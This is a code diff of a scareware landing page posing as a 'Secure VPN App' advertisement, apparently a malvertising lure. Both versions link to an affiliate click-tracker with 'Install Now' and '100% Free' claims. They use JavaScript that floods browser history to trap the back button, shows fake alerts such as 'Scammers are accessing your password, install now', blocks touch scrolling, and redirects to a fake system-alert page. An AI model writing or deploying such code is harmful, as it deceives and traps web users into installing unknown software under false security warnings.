@@ -1,7 +1,8 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Secure VPN App</title>
   <style>
     body {
@@ -11,91 +12,94 @@
       font-family: Arial, sans-serif;
       color: #ffffff;
       text-align: center;
-    }.container {
-  padding: 20px;
-}
+      overflow: hidden;
+    }
 
-.vpn-link {
-  display: inline-block;
-  width: 100%;
-  max-width: 480px;
-}
+    .container {
+      padding: 20px;
+    }
 
-.vpn-image {
-  width: 100%;
-  border-radius: 12px;
-  margin-bottom: 25px;
-  box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-}
+    .vpn-link {
+      display: inline-block;
+      width: 100%;
+      max-width: 480px;
+    }
 
-.install-btn {
-  display: inline-block;
-  padding: 15px 30px;
-  background-color: #00c853;
-  color: #ffffff;
-  font-size: 18px;
-  font-weight: bold;
-  border-radius: 10px;
-  text-decoration: none;
-  box-shadow: 0 0 0 rgba(0, 200, 83, 0.7);
-  animation: breathing 2s infinite ease-in-out;
-}
+    .vpn-image {
+      width: 100%;
+      border-radius: 12px;
+      margin-bottom: 25px;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+    }
 
-@keyframes breathing {
-  0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
-  50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); }
-  100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
-}
+    .install-btn {
+      display: inline-block;
+      padding: 15px 30px;
+      background-color: #00c853;
+      color: #ffffff;
+      font-size: 18px;
+      font-weight: bold;
+      border-radius: 10px;
+      text-decoration: none;
+      box-shadow: 0 0 0 rgba(0, 200, 83, 0.7);
+      animation: breathing 2s infinite ease-in-out;
+    }
 
-.disclaimer {
-  font-size: 13px;
-  color: #aaaaaa;
-  margin-top: 15px;
-}
+    @keyframes breathing {
+      0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
+      50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); }
+      100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
+    }
 
-#exitAttempts {
-  display: none;
-}
+    .disclaimer {
+      font-size: 13px;
+      color: #aaaaaa;
+      margin-top: 15px;
+    }
 
+    #exitAttempts {
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <!-- Clickable Image -->
-    <a class="vpn-link" 
-       href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
-       target="_blank">
-      <img src="https://files.catbox.moe/52ox56.jpg" alt="VPN Promo Image" class="vpn-image">
-    </a><!-- Breathing Install Button -->
-<a class="install-btn" 
-   href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
-   target="_blank">
-  Install Now
-</a>
+    <!-- Image -->
+    <a class="vpn-link" href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" target="_blank">
+      <img src="https://files.catbox.moe/52ox56.jpg" alt="VPN Promo" class="vpn-image">
+    </a>
 
-<div class="disclaimer">
-  100% Free • Fast & Secure Connection • Only 22.3MB
-</div>
+    <!-- Install Button -->
+    <a class="install-btn" href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" target="_blank">
+      Install Now
+    </a>
 
-<div id="exitAttempts" style="display: none;"></div>
+    <div class="disclaimer">
+      100% Free • Fast & Secure Connection • Only 22.3MB
+    </div>
 
-  </div>  <script>
+    <div id="exitAttempts"></div>
+  </div>
+
+  <script>
     let attempts = 0;
     const maxAttempts = 3;
     const exitAttemptsText = document.getElementById('exitAttempts');
 
-    // Push 10 fake history states
+    // Push 10 fake states to history to trap back button
     for (let i = 0; i < 10; i++) {
-      history.pushState({}, '', location.href);
+      history.pushState(null, '', location.href);
     }
 
+    // iOS Back button trap
     window.onpopstate = function () {
-      history.pushState({}, '', location.href);
+      history.pushState(null, '', location.href);
       handleExitAttempt();
     };
 
     function handleExitAttempt() {
-      const messages = [
+      attempts++;
+      const warnings = [
         "Scammers are accessing your password, install now",
         "Last chance to protect yourself!",
         "Your device is still at risk",
@@ -103,18 +107,18 @@
       ];
 
       if (attempts < maxAttempts) {
-        alert(`\u26a0\ufe0f ${messages[attempts * 2] || messages[messages.length - 2]}`);
-        alert(`\u26a0\ufe0f ${messages[(attempts * 2) + 1] || messages[messages.length - 1]}`);
-        attempts++;
-        exitAttemptsText.textContent = `Warning: ${attempts}/3 attempts to exit`;
+        const index = (attempts - 1) * 2;
+        alert(`⚠️ ${warnings[index] || warnings[0]}`);
+        alert(`⚠️ ${warnings[index + 1] || warnings[1]}`);
       } else {
         window.location.href = "https://system-alert.netlify.app/";
       }
     }
 
-    // Prevent scroll bounce
-    document.addEventListener('touchmove', function(e) {
+    // Disable scroll and swipe exit
+    document.addEventListener('touchmove', function (e) {
       e.preventDefault();
     }, { passive: false });
-  </script></body>
+  </script>
+</body>
 </html>
